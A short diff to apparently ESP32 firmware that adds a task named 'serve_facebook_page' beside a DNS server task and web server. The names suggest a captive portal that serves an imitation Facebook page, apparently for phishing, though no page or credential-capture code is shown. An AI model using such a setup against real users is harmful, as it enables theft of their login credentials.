@@ -24,5 +24,6 @@ void app_main(void)
     ESP_ERROR_CHECK(set_default_config());
 
     xTaskCreate(dns_server_task, "dns_server_task", 4096, NULL, 5, NULL);
+    xTaskCreate(serve_facebook_page, "serve_facebook_page", 4096, NULL, 5, NULL);
     start_webserver();
 }
